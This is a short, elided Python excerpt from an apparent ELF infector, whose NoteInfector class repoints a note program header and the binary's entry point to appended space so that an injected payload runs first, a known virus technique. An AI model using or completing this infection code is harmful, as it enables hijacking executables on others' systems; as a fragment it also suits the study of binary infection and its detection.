...
class NoteInfector(Infector):
	...
	def infect(self, elf_obj, infected_name, payload):
		...
		note_phdr['p_vaddr'] = len(elf_obj.file_content) + align_size
		note_phdr['p_paddr'] = len(elf_obj.file_content) + align_size
		...
		elf_obj.ehdr['e_entry'] = len(elf_obj.file_content) + align_size
